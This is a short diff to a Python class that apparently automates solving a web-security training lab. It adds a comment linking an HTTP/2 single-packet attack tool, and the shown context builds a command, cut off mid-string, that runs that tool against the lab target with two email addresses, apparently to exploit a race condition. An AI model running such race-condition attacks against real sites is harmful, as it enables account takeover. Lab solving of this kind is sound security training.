@@ -41,6 +41,7 @@ class LabSolver:
         email1 = 'hacker@' + self.email_client_url.replace('https://', '').replace('/email', '')
         email2 = 'carlos@ginandjuice.shop'
 
+        # https://github.com/ma4747gh/H2SinglePacketAttacker
         found = False
         while not found:
             command = (('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 --tls_channel --streams 2 '
